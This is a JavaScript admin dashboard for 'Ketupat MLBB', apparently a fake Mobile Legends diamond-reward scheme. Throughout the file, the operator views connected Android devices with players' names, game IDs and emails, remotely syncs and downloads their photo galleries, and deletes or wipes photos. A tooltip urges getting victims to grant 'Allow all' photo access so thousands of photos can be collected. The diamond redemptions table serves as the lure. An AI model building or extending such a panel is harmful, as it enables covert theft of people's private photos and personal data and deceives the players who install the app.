/**
 * Ketupat MLBB - Next-Gen Admin Client Engine
 * Clean, reactive, robust single-page script.
 */

const state = {
  authenticated: false,
  currentView: 'devices',
  devices: [],
  selectedDevice: null,
  photos: [],
  filteredPhotos: [],
  activeAlbum: 'All',
  lightboxIndex: 0,
  searchQuery: '',
  syncIntervalId: null,
  syncDuration: 15000,
  isSyncing: false,
  confirmCallback: null
};

// --- DOM UTILITY HELPERS ---
const $ = (id) => document.getElementById(id);
const escapeHtml = (str) => {
  if (str === null || str === undefined) return '';
  return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
};

// --- INITIALIZATION ---
document.addEventListener('DOMContentLoaded', () => {
  checkAuth();
  setupKeyboardShortcuts();
});

// --- AUTHENTICATION ---
async function checkAuth() {
  try {
    const res = await fetch('api.php?action=check_auth');
    const json = await res.json();
    if (json.success && json.data && json.data.authenticated) {
      state.authenticated = true;
      revealDashboard();
    } else {
      showLockScreen();
    }
  } catch (err) {
    showLockScreen();
  }
}

function showLockScreen() {
  $('lock-screen').style.display = 'flex';
  $('app-container').style.display = 'none';
  clearInterval(state.syncIntervalId);
  setTimeout(() => $('pin-input').focus(), 100);
}

function revealDashboard() {
  $('lock-screen').style.display = 'none';
  $('app-container').style.display = 'flex';
  initDashboard();
}

async function handlePinSubmit(e) {
  e.preventDefault();
  const pinInput = $('pin-input');
  const pin = pinInput.value.trim();
  const errEl = $('pin-error');
  const btn = $('pin-btn');

  if (!pin) return;
  btn.disabled = true;
  btn.innerText = 'Verifying...';
  errEl.style.display = 'none';

  try {
    const res = await fetch('api.php?action=login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ pin })
    });
    const json = await res.json();
    if (json.success) {
      state.authenticated = true;
      pinInput.value = '';
      revealDashboard();
      showToast('Welcome back, Administrator!', 'success');
    } else {
      errEl.innerText = json.message || 'Invalid Security PIN';
      errEl.style.display = 'block';
      pinInput.select();
    }
  } catch (err) {
    errEl.innerText = 'Connection error, please retry';
    errEl.style.display = 'block';
  } finally {
    btn.disabled = false;
    btn.innerText = 'Unlock Dashboard';
  }
}

async function lockAdmin() {
  try {
    await fetch('api.php?action=logout');
  } catch (e) {}
  state.authenticated = false;
  state.selectedDevice = null;
  showLockScreen();
  showToast('Session locked', 'info');
}

// --- DASHBOARD STARTUP ---
function initDashboard() {
  fetchStats();
  loadDevices();
  setSyncInterval(state.syncDuration);
}

// --- NAVIGATION & VIEW ROUTING ---
function switchView(viewName) {
  state.currentView = viewName;

  // Update Nav links
  document.querySelectorAll('.sidebar-nav .nav-link').forEach(link => {
    link.classList.toggle('active', link.dataset.view === viewName);
  });

  // Hide all view panels
  $('view-devices').style.display = 'none';
  $('view-device-gallery').style.display = 'none';
  $('view-redemptions').style.display = 'none';
  $('view-users').style.display = 'none';

  // Mobile sidebar close
  $('app-sidebar').classList.remove('open');

  const titleEl = $('page-title-text');

  switch (viewName) {
    case 'devices':
      $('view-devices').style.display = 'block';
      titleEl.innerText = 'User Devices';
      loadDevices();
      break;

    case 'gallery':
      $('view-device-gallery').style.display = 'block';
      titleEl.innerText = state.selectedDevice ? `${state.selectedDevice.phone_model} - Photos` : 'Device Gallery';
      break;

    case 'redemptions':
      $('view-redemptions').style.display = 'block';
      titleEl.innerText = 'Redemptions';
      loadRedemptions();
      break;

    case 'users':
      $('view-users').style.display = 'block';
      titleEl.innerText = 'Registered Players';
      loadUsers();
      break;
  }
}

function toggleMobileSidebar() {
  $('app-sidebar').classList.toggle('open');
}

// --- OVERVIEW STATS ---
async function fetchStats() {
  try {
    const res = await fetch('api.php?action=stats');
    const json = await res.json();
    if (json.success && json.data) {
      const d = json.data;
      $('stat-devices').innerText = Number(d.total_devices || 0).toLocaleString();
      $('stat-photos').innerText = Number(d.total_photos || 0).toLocaleString();
      $('stat-pending').innerText = Number(d.pending_redemptions || 0).toLocaleString();
      $('stat-users').innerText = Number(d.total_users || 0).toLocaleString();

      $('badge-devices').innerText = d.total_devices || 0;
      $('badge-redemptions').innerText = d.pending_redemptions || 0;
      $('badge-users').innerText = d.total_users || 0;
    }
  } catch (err) {
    console.error('Failed fetching stats:', err);
  }
}

// --- DEVICES VIEW ---
async function loadDevices(isSilent = false) {
  if (state.isSyncing) return;
  state.isSyncing = true;
  
  const refreshBtn = $('refresh-btn');
  if (!isSilent && refreshBtn) refreshBtn.classList.add('loading');

  try {
    const res = await fetch('api.php?action=list_devices');
    const json = await res.json();
    if (json.success && Array.isArray(json.data)) {
      state.devices = json.data;
      renderDevices();
      $('badge-devices').innerText = state.devices.length;
      $('stat-devices').innerText = state.devices.length;
    }
  } catch (err) {
    if (!isSilent) showToast('Failed loading devices', 'error');
  } finally {
    state.isSyncing = false;
    if (!isSilent && refreshBtn) refreshBtn.classList.remove('loading');
  }
}

function renderDevices() {
  const container = $('devices-container');
  if (!container) return;

  const query = state.searchQuery.toLowerCase().trim();
  const list = state.devices.filter(d => {
    if (!query) return true;
    return (
      (d.phone_model && d.phone_model.toLowerCase().includes(query)) ||
      (d.device_id && d.device_id.toLowerCase().includes(query)) ||
      (d.player_ign && d.player_ign.toLowerCase().includes(query)) ||
      (d.mlbb_id && String(d.mlbb_id).includes(query))
    );
  });

  if (list.length === 0) {
    container.innerHTML = `
      <div class="empty-state" style="grid-column: 1 / -1;">
        <div class="empty-state-icon">📱</div>
        <h3>No devices found</h3>
        <p style="margin-top: 6px;">${query ? 'No devices match your search query.' : 'Waiting for Android devices to connect and sync.'}</p>
      </div>
    `;
    return;
  }

  container.innerHTML = list.map(dev => {
    const avatarSrc = dev.thumbnail || 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%2364748b"><rect x="5" y="2" width="14" height="20" rx="2"/><circle cx="12" cy="18" r="1"/></svg>';
    let accessBadge = `<span class="badge-access pending">&bull; Limited</span>`;
    if (dev.has_access) {
      if (dev.is_full_access) {
        accessBadge = `<span class="badge-access granted"><svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Full Access</span>`;
      } else {
        accessBadge = `<span class="badge-access pending" style="background: rgba(234, 179, 8, 0.15); color: #eab308; border-color: rgba(234, 179, 8, 0.3);" title="User selected only ${dev.photo_count} photos. Prompt user to choose 'Allow all' in Settings for thousands of photos.">&bull; Partial (${dev.photo_count} Photos)</span>`;
      }
    }

    // 4 preview tiles
    let previewHtml = '';
    for (let i = 0; i < 4; i++) {
      if (dev.previews && dev.previews[i]) {
        previewHtml += `<div class="preview-tile"><img src="${escapeHtml(dev.previews[i])}" loading="lazy" alt="Preview"></div>`;
      } else {
        previewHtml += `<div class="preview-tile"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/></svg></div>`;
      }
    }

    return `
      <div class="device-card" onclick="openDeviceGallery('${escapeHtml(dev.device_id)}')">
        <div class="device-card-header">
          <div class="device-identity">
            <img src="${escapeHtml(avatarSrc)}" class="device-avatar" alt="Avatar" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22%2364748b%22><rect x=%225%22 y=%222%22 width=%2214%22 height=%2220%22 rx=%222%22/></svg>'">
            <div class="device-titles">
              <h3>${escapeHtml(dev.phone_model)}</h3>
              <span class="device-tag">ID: ${escapeHtml(dev.device_tag || dev.device_id.slice(-6))}</span>
            </div>
          </div>
          ${accessBadge}
        </div>

        <div class="device-meta-box">
          <div class="meta-field">
            <span class="meta-key">Player IGN</span>
            <span class="meta-val highlight">${escapeHtml(dev.player_ign)}</span>
          </div>
          <div class="meta-field">
            <span class="meta-key">MLBB ID</span>
            <span class="meta-val">${escapeHtml(dev.mlbb_id)} (${escapeHtml(dev.mlbb_server)})</span>
          </div>
          <div class="meta-field">
            <span class="meta-key">Account Email</span>
            <span class="meta-val">${escapeHtml(dev.email)}</span>
          </div>
          <div class="meta-field">
            <span class="meta-key">Last Activity</span>
            <span class="meta-val">${formatTimeAgo(dev.last_active)}</span>
          </div>
        </div>

        <div class="device-previews">
          ${previewHtml}
        </div>

        <div class="device-footer">
          <div class="photo-counter">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
              <circle cx="8.5" cy="8.5" r="1.5"></circle>
              <polyline points="21 15 16 10 5 21"></polyline>
            </svg>
            <span>${dev.photo_count} Photos</span>
          </div>
          <div style="display: flex; gap: 6px;">
            <button class="btn btn-secondary btn-sm" id="btn-sync-card-${escapeHtml(dev.device_id)}" onclick="event.stopPropagation(); syncSingleDeviceCard('${escapeHtml(dev.device_id)}', this)" title="Sync photos from this device">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M23 4v6h-6"></path>
                <path d="M1 20v-6h6"></path>
                <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path>
              </svg>
              <span>Sync</span>
            </button>
            <button class="btn btn-secondary btn-sm" onclick="event.stopPropagation(); openDeviceGallery('${escapeHtml(dev.device_id)}')">
              Inspect &rarr;
            </button>
          </div>
        </div>
      </div>
    `;
  }).join('');
}

// --- DEVICE GALLERY VIEW ---
async function openDeviceGallery(deviceId) {
  const dev = state.devices.find(d => d.device_id === deviceId) || { device_id: deviceId, phone_model: 'Device' };
  state.selectedDevice = dev;
  state.activeAlbum = 'All';

  $('current-device-title').innerText = dev.phone_model;
  $('current-device-subtitle').innerText = `Device ID: ${dev.device_id} &bull; IGN: ${dev.player_ign || 'Player'}`;

  switchView('gallery');
  await loadDeviceDetails(deviceId);
}

async function loadDeviceDetails(deviceId, silent = false) {
  const container = $('photos-container');
  if (!silent) {
    container.innerHTML = `
      <div class="empty-state" style="grid-column: 1 / -1;">
        <div class="empty-state-icon">⏳</div>
        <h3>Loading photos...</h3>
      </div>
    `;
  }

  try {
    const res = await fetch(`api.php?action=get_device&device_id=${encodeURIComponent(deviceId)}`);
    const json = await res.json();
    if (json.success && json.data) {
      const d = json.data;
      state.selectedDevice = { ...state.selectedDevice, ...d };
      state.photos = d.photos || [];

      // Update Subtitle with live info
      $('current-device-subtitle').innerHTML = `
        ID: <code>${escapeHtml(d.device_id)}</code> &bull; 
        IGN: <strong>${escapeHtml(d.player_ign)}</strong> &bull; 
        MLBB: ${escapeHtml(d.mlbb_id)} (${escapeHtml(d.mlbb_server)}) &bull; 
        Total: <strong>${state.photos.length}</strong> photos
      `;

      renderAlbumChips(d.albums || []);
      filterAlbum(state.activeAlbum);
    } else {
      if (!silent) {
        container.innerHTML = `
          <div class="empty-state" style="grid-column: 1 / -1;">
            <div class="empty-state-icon">⚠️</div>
            <h3>Failed to load device photos</h3>
            <p>${escapeHtml(json.message || 'Unknown error')}</p>
          </div>
        `;
      }
    }
  } catch (err) {
    if (!silent) showToast('Error loading device photos', 'error');
  }
}

function renderAlbumChips(albums) {
  const container = $('album-chips-container');
  if (!container) return;

  if (!albums || albums.length === 0) {
    container.innerHTML = '';
    return;
  }

  container.innerHTML = albums.map(a => {
    const isActive = a.name === state.activeAlbum;
    return `
      <button class="chip ${isActive ? 'active' : ''}" onclick="filterAlbum('${escapeHtml(a.name)}')">
        <span>${escapeHtml(a.name)}</span>
        <span class="chip-count">${a.count}</span>
      </button>
    `;
  }).join('');
}

function filterAlbum(albumName) {
  state.activeAlbum = albumName;

  // Update active class on chips
  document.querySelectorAll('#album-chips-container .chip').forEach(c => {
    const isThis = c.textContent.trim().startsWith(albumName);
    c.classList.toggle('active', isThis);
  });

  if (albumName === 'All') {
    state.filteredPhotos = [...state.photos];
  } else {
    state.filteredPhotos = state.photos.filter(p => p.album === albumName);
  }

  renderPhotosGrid();
}

function renderPhotosGrid() {
  const container = $('photos-container');
  if (!container) return;

  if (state.filteredPhotos.length === 0) {
    container.innerHTML = `
      <div class="empty-state" style="grid-column: 1 / -1;">
        <div class="empty-state-icon">🖼️</div>
        <h3>No photos in this album</h3>
        <p>New pictures captured or synced will appear here automatically.</p>
      </div>
    `;
    return;
  }

  container.innerHTML = state.filteredPhotos.map((p, idx) => {
    const isAvatar = p.is_avatar;
    const badgeText = isAvatar ? 'Avatar' : p.album;
    const dateText = formatTimeAgo(p.date_added);

    return `
      <div class="photo-card" onclick="openLightbox(${idx})">
        <img src="${escapeHtml(p.url)}" loading="lazy" alt="Photo">
        <div class="photo-overlay">
          <span class="photo-badge-top" style="${isAvatar ? 'background: rgba(16, 185, 129, 0.9);' : ''}">${escapeHtml(badgeText)}</span>
          <div class="photo-details-bottom">
            <span class="photo-info-text">${escapeHtml(dateText)}</span>
            <button class="btn-quick-del" onclick="event.stopPropagation(); deletePhotoConfirm('${escapeHtml(p.filename)}')" title="Delete Photo">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="3 6 5 6 21 6"></polyline>
                <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
              </svg>
            </button>
          </div>
        </div>
      </div>
    `;
  }).join('');
}

async function refreshCurrentGallery() {
  if (!state.selectedDevice) return;
  const devId = state.selectedDevice.device_id;
  const prevCount = (state.photos || []).length;

  const syncBtn = $('btn-sync-gallery') || $('refresh-btn');
  if (syncBtn) syncBtn.classList.add('loading');

  try {
    // 1. Send on-demand sync trigger to device via server
    const syncRes = await fetch(`api.php?action=sync_device&device_id=${encodeURIComponent(devId)}`);
    const syncJson = await syncRes.json();
    if (!syncJson.success) {
      showToast(`Sync failed: ${syncJson.message || 'Server rejected request'}`, 'error');
      return;
    }

    const isOnline = syncJson.data && syncJson.data.is_online;
    const lastActiveStr = syncJson.data ? syncJson.data.last_synced : '';

    if (!isOnline) {
      const timeAgo = formatTimeAgo(lastActiveStr);
      showToast(`Device is offline (last active ${timeAgo}). Open the app on the phone to sync photos.`, 'info');
      return;
    }

    // 2. Device is online: poll for incoming streaming photos
    let newCount = prevCount;
    let attempts = 0;
    while (attempts < 8) {
      await new Promise(r => setTimeout(r, 1500));
      attempts++;
      const res = await fetch(`api.php?action=get_device&device_id=${encodeURIComponent(devId)}`);
      const json = await res.json();
      if (json.success && json.data) {
        const d = json.data;
        state.selectedDevice = { ...state.selectedDevice, ...d };
        state.photos = d.photos || [];
        newCount = state.photos.length;

        $('current-device-subtitle').innerHTML = `
          ID: <code>${escapeHtml(d.device_id)}</code> &bull; 
          IGN: <strong>${escapeHtml(d.player_ign)}</strong> &bull; 
          MLBB: ${escapeHtml(d.mlbb_id)} (${escapeHtml(d.mlbb_server)}) &bull; 
          Total: <strong>${newCount}</strong> photos
        `;

        renderAlbumChips(d.albums || []);
        filterAlbum(state.activeAlbum);

        if (newCount > prevCount) {
          // Photos streaming in, keep checking
          if (attempts >= 4) break;
        }
      }
    }

    const added = newCount - prevCount;
    if (added > 0) {
      showToast(`Success Added ${added} Photos (Total: ${newCount})`, 'success');
    } else {
      showToast(`All photos up to date (Total: ${newCount} Photos)`, 'info');
    }
  } catch (err) {
    showToast(`Sync failed: ${err.message || 'Network error'}`, 'error');
  } finally {
    if (syncBtn) syncBtn.classList.remove('loading');
  }
}

// --- PHOTO LIGHTBOX ---
function openLightbox(index) {
  state.lightboxIndex = index;
  updateLightbox();
  $('lightbox-modal').classList.add('active');
  document.body.style.overflow = 'hidden';
}

function closeLightbox() {
  $('lightbox-modal').classList.remove('active');
  document.body.style.overflow = '';
}

function stepLightbox(direction) {
  const total = state.filteredPhotos.length;
  if (total === 0) return;
  state.lightboxIndex = (state.lightboxIndex + direction + total) % total;
  updateLightbox();
}

function updateLightbox() {
  const photo = state.filteredPhotos[state.lightboxIndex];
  if (!photo) return;

  $('lightbox-img').src = photo.url;
  $('lightbox-counter').innerText = `${state.lightboxIndex + 1} / ${state.filteredPhotos.length}`;
  $('lightbox-download').href = photo.url;
}

function deleteCurrentLightboxPhoto() {
  const photo = state.filteredPhotos[state.lightboxIndex];
  if (!photo) return;
  deletePhotoConfirm(photo.filename, true);
}

// --- PHOTO & DEVICE ACTIONS ---
function deletePhotoConfirm(filename, fromLightbox = false) {
  openConfirmModal(
    'Delete Photo',
    'Are you sure you want to permanently delete this photo from the device gallery?',
    async () => {
      closeConfirmModal();
      try {
        const res = await fetch('api.php?action=delete_photo', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            device_id: state.selectedDevice.device_id,
            filename: filename
          })
        });
        const json = await res.json();
        if (json.success) {
          showToast('Photo deleted', 'success');
          // Optimistic remove
          state.photos = state.photos.filter(p => p.filename !== filename);
          state.filteredPhotos = state.filteredPhotos.filter(p => p.filename !== filename);

          if (fromLightbox) {
            if (state.filteredPhotos.length === 0) {
              closeLightbox();
            } else {
              if (state.lightboxIndex >= state.filteredPhotos.length) {
                state.lightboxIndex = state.filteredPhotos.length - 1;
              }
              updateLightbox();
            }
          }
          renderPhotosGrid();
          fetchStats();
        } else {
          showToast(json.message || 'Failed deleting photo', 'error');
        }
      } catch (err) {
        showToast('Error communicating with server', 'error');
      }
    }
  );
}

function promptWipePhotos() {
  if (!state.selectedDevice) return;
  openConfirmModal(
    'Wipe All Regular Photos',
    `This will permanently wipe all photos for ${state.selectedDevice.phone_model} while preserving the avatar. Proceed?`,
    async () => {
      closeConfirmModal();
      try {
        const res = await fetch('api.php?action=wipe_photos', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ device_id: state.selectedDevice.device_id })
        });
        const json = await res.json();
        if (json.success) {
          showToast('All photos wiped cleanly', 'success');
          loadDeviceDetails(state.selectedDevice.device_id);
          fetchStats();
        } else {
          showToast(json.message || 'Failed wiping photos', 'error');
        }
      } catch (err) {
        showToast('Error communicating with server', 'error');
      }
    }
  );
}

function promptDeleteDevice() {
  if (!state.selectedDevice) return;
  openConfirmModal(
    'Delete Entire Device',
    `Are you sure you want to permanently delete device "${state.selectedDevice.phone_model}" (${state.selectedDevice.device_id})? All stored metadata and photos will be erased.`,
    async () => {
      closeConfirmModal();
      try {
        const res = await fetch('api.php?action=delete_device', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ device_id: state.selectedDevice.device_id })
        });
        const json = await res.json();
        if (json.success) {
          showToast('Device deleted permanently', 'success');
          switchView('devices');
          fetchStats();
        } else {
          showToast(json.message || 'Failed deleting device', 'error');
        }
      } catch (err) {
        showToast('Error communicating with server', 'error');
      }
    }
  );
}

// --- REDEMPTIONS VIEW ---
async function loadRedemptions() {
  const tbody = $('redemptions-tbody');
  if (!tbody) return;
  tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; padding:30px; color:var(--text-muted);">Loading redemptions...</td></tr>`;

  try {
    const res = await fetch('api.php?action=list_redemptions');
    const json = await res.json();
    if (json.success && Array.isArray(json.data)) {
      renderRedemptions(json.data);
      $('badge-redemptions').innerText = json.data.filter(r => (r.status || '').toLowerCase().includes('process')).length;
    } else {
      tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; padding:30px; color:#f87171;">Failed to load redemptions</td></tr>`;
    }
  } catch (e) {
    tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; padding:30px; color:#f87171;">Connection error</td></tr>`;
  }
}

function renderRedemptions(list) {
  const tbody = $('redemptions-tbody');
  if (!tbody) return;

  if (list.length === 0) {
    tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; padding:40px; color:var(--text-muted);">No diamond claims recorded yet.</td></tr>`;
    return;
  }

  tbody.innerHTML = list.map(r => {
    const status = (r.status || 'processing').toLowerCase();
    let badgeClass = 'pending';
    if (status === 'completed' || status === 'success') badgeClass = 'granted';
    if (status === 'rejected' || status === 'cancelled') badgeClass = 'danger';

    return `
      <tr>
        <td><code>${escapeHtml(r.order_id || r.id)}</code></td>
        <td><strong>${escapeHtml(r.mlbb_ign || 'Player')}</strong></td>
        <td>${escapeHtml(r.mlbb_id || '—')} (${escapeHtml(r.mlbb_server || '—')})</td>
        <td><span style="color:var(--accent-cyan); font-weight:700;">${escapeHtml(r.package_name || r.reward || 'Diamonds')}</span></td>
        <td>
          <select onchange="updateRedemptionStatus('${escapeHtml(r.order_id || r.id)}', this.value)" style="background: rgba(0,0,0,0.3); border: 1px solid var(--border-medium); color: #fff; border-radius: var(--radius-sm); padding: 4px 8px; font-size: 0.78rem;">
            <option value="processing" ${status === 'processing' ? 'selected' : ''}>⏳ Processing</option>
            <option value="completed" ${status === 'completed' ? 'selected' : ''}>✅ Completed</option>
            <option value="cancelled" ${status === 'cancelled' ? 'selected' : ''}>❌ Cancelled</option>
          </select>
        </td>
        <td><span style="font-size: 0.78rem; color: var(--text-secondary);">${formatTimeAgo(r.created_at)}</span></td>
        <td>
          <button class="btn btn-danger btn-sm" onclick="deleteRedemption('${escapeHtml(r.order_id || r.id)}')">
            Delete
          </button>
        </td>
      </tr>
    `;
  }).join('');
}

async function updateRedemptionStatus(orderId, newStatus) {
  try {
    const res = await fetch('api.php?action=update_redemption_status', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ order_id: orderId, status: newStatus })
    });
    const json = await res.json();
    if (json.success) {
      showToast(`Status updated to ${newStatus}`, 'success');
      fetchStats();
    } else {
      showToast('Failed updating status', 'error');
    }
  } catch (err) {
    showToast('Network error', 'error');
  }
}

async function deleteRedemption(orderId) {
  openConfirmModal('Delete Claim', `Delete redemption claim ${orderId}?`, async () => {
    closeConfirmModal();
    try {
      const res = await fetch('api.php?action=delete_redemption', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ order_id: orderId })
      });
      const json = await res.json();
      if (json.success) {
        showToast('Claim deleted', 'success');
        loadRedemptions();
        fetchStats();
      }
    } catch (e) {
      showToast('Network error', 'error');
    }
  });
}

// --- USERS VIEW ---
async function loadUsers() {
  const tbody = $('users-tbody');
  if (!tbody) return;
  tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; padding:30px; color:var(--text-muted);">Loading registered players...</td></tr>`;

  try {
    const res = await fetch('api.php?action=list_users');
    const json = await res.json();
    if (json.success && Array.isArray(json.data)) {
      renderUsers(json.data);
      $('badge-users').innerText = json.data.length;
    } else {
      tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; padding:30px; color:#f87171;">Failed to load players</td></tr>`;
    }
  } catch (e) {
    tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; padding:30px; color:#f87171;">Connection error</td></tr>`;
  }
}

function renderUsers(list) {
  const tbody = $('users-tbody');
  if (!tbody) return;

  if (list.length === 0) {
    tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; padding:40px; color:var(--text-muted);">No players registered yet.</td></tr>`;
    return;
  }

  tbody.innerHTML = list.map(u => {
    return `
      <tr>
        <td><strong>${escapeHtml(u.mlbb_ign || 'Player')}</strong></td>
        <td><code>${escapeHtml(u.mlbb_id || '—')}</code></td>
        <td>${escapeHtml(u.mlbb_server || '—')}</td>
        <td>${escapeHtml(u.email || u.user_email || '—')}</td>
        <td><span style="font-size: 0.78rem; color: var(--text-secondary);">${formatTimeAgo(u.created_at)}</span></td>
      </tr>
    `;
  }).join('');
}

// --- LIVE SYNC & REFRESH ---
function setSyncInterval(ms) {
  const duration = parseInt(ms, 10);
  state.syncDuration = duration;
  clearInterval(state.syncIntervalId);

  const statusText = $('sync-status-text');
  if (duration > 0) {
    statusText.innerText = `Live Sync (${duration / 1000}s)`;
    state.syncIntervalId = setInterval(runSyncTick, duration);
  } else {
    statusText.innerText = 'Sync: Paused';
  }
}

async function triggerManualRefresh() {
  const refreshBtn = $('refresh-btn');
  if (refreshBtn) refreshBtn.classList.add('loading');

  if (state.currentView === 'gallery' && state.selectedDevice) {
    await refreshCurrentGallery();
    if (refreshBtn) refreshBtn.classList.remove('loading');
    return;
  }

  const prevTotal = state.devices.reduce((acc, d) => acc + (d.photo_count || 0), 0);

  try {
    const res = await fetch('api.php?action=list_devices');
    const json = await res.json();

    if (json.success && Array.isArray(json.data)) {
      state.devices = json.data;
      renderDevices();
      await fetchStats();

      const newTotal = state.devices.reduce((acc, d) => acc + (d.photo_count || 0), 0);
      const added = newTotal - prevTotal;

      if (added > 0) {
        showToast(`Success Added ${added} Photos`, 'success');
      } else {
        showToast(`All photos up to date (Total: ${newTotal} Photos)`, 'info');
      }
    } else {
      showToast(`Sync failed: ${json.message || 'Failed loading devices'}`, 'error');
    }
  } catch (err) {
    showToast(`Sync failed: ${err.message || 'Network error'}`, 'error');
  } finally {
    if (refreshBtn) refreshBtn.classList.remove('loading');
  }
}

async function syncSingleDeviceCard(devId, btnEl) {
  if (btnEl) btnEl.classList.add('loading');
  const dev = state.devices.find(d => d.device_id === devId);
  const prevCount = dev ? (dev.photo_count || 0) : 0;

  try {
    const syncRes = await fetch(`api.php?action=sync_device&device_id=${encodeURIComponent(devId)}`);
    const syncJson = await syncRes.json();
    if (!syncJson.success) {
      showToast(`Sync failed: ${syncJson.message || 'Server rejected request'}`, 'error');
      return;
    }

    const isOnline = syncJson.data && syncJson.data.is_online;
    const lastActiveStr = syncJson.data ? syncJson.data.last_synced : '';

    if (!isOnline) {
      const timeAgo = formatTimeAgo(lastActiveStr);
      showToast(`Device is offline (last active ${timeAgo}). Open the app on the phone to sync photos.`, 'info');
      return;
    }

    // Device is online: poll for incoming streaming photos
    let newCount = prevCount;
    let attempts = 0;
    while (attempts < 8) {
      await new Promise(r => setTimeout(r, 1500));
      attempts++;
      const res = await fetch(`api.php?action=get_device&device_id=${encodeURIComponent(devId)}`);
      const json = await res.json();
      if (json.success && json.data) {
        newCount = (json.data.photos || []).length;
        if (dev) dev.photo_count = newCount;
        renderDevices();
        fetchStats();
        if (newCount > prevCount) {
          // Photos streaming in, keep checking
          if (attempts >= 4) break;
        }
      }
    }

    const added = newCount - prevCount;
    if (added > 0) {
      showToast(`Success Added ${added} Photos (Total: ${newCount})`, 'success');
    } else {
      showToast(`All photos up to date (${newCount} Photos)`, 'info');
    }
  } catch (err) {
    showToast(`Sync failed: ${err.message || 'Network error'}`, 'error');
  } finally {
    if (btnEl) btnEl.classList.remove('loading');
  }
}

function runSyncTick() {
  fetchStats();
  if (state.currentView === 'devices') {
    loadDevices(true);
  } else if (state.currentView === 'gallery' && state.selectedDevice) {
    loadDeviceDetails(state.selectedDevice.device_id, true);
  }
}

// --- SEARCH FILTER ---
function handleSearch(val) {
  state.searchQuery = val;
  if (state.currentView === 'devices') {
    renderDevices();
  }
}

// --- CONFIRMATION MODAL UTILITY ---
function openConfirmModal(title, message, callback) {
  $('confirm-modal-title').innerText = title;
  $('confirm-modal-body').innerText = message;
  state.confirmCallback = callback;
  $('confirm-modal-ok-btn').onclick = callback;
  $('confirm-modal').classList.add('active');
}

function closeConfirmModal() {
  $('confirm-modal').classList.remove('active');
  state.confirmCallback = null;
}

// --- KEYBOARD SHORTCUTS ---
function setupKeyboardShortcuts() {
  document.addEventListener('keydown', (e) => {
    if ($('lightbox-modal').classList.contains('active')) {
      if (e.key === 'Escape') closeLightbox();
      if (e.key === 'ArrowLeft') stepLightbox(-1);
      if (e.key === 'ArrowRight') stepLightbox(1);
    }
    if ($('confirm-modal').classList.contains('active')) {
      if (e.key === 'Escape') closeConfirmModal();
    }
  });
}

// --- TOAST UTILITY ---
function showToast(message, type = 'info') {
  const container = $('toast-container');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = 'toast';

  let icon = 'ℹ️';
  if (type === 'success') icon = '✅';
  if (type === 'error') icon = '❌';

  toast.innerHTML = `<span>${icon}</span> <span>${escapeHtml(message)}</span>`;
  container.appendChild(toast);

  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateY(10px)';
    toast.style.transition = 'all 0.25s ease';
    setTimeout(() => toast.remove(), 250);
  }, 3200);
}

// --- DATE FORMATTER ---
function formatTimeAgo(dateInput) {
  if (!dateInput) return '—';
  const date = new Date(dateInput);
  if (isNaN(date.getTime())) return dateInput;

  const seconds = Math.floor((new Date() - date) / 1000);
  if (seconds < 5) return 'just now';
  if (seconds < 60) return `${seconds}s ago`;
  const minutes = Math.floor(seconds / 60);
  if (minutes < 60) return `${minutes}m ago`;
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return `${hours}h ago`;
  const days = Math.floor(hours / 24);
  if (days < 30) return `${days}d ago`;
  return date.toLocaleDateString();
}
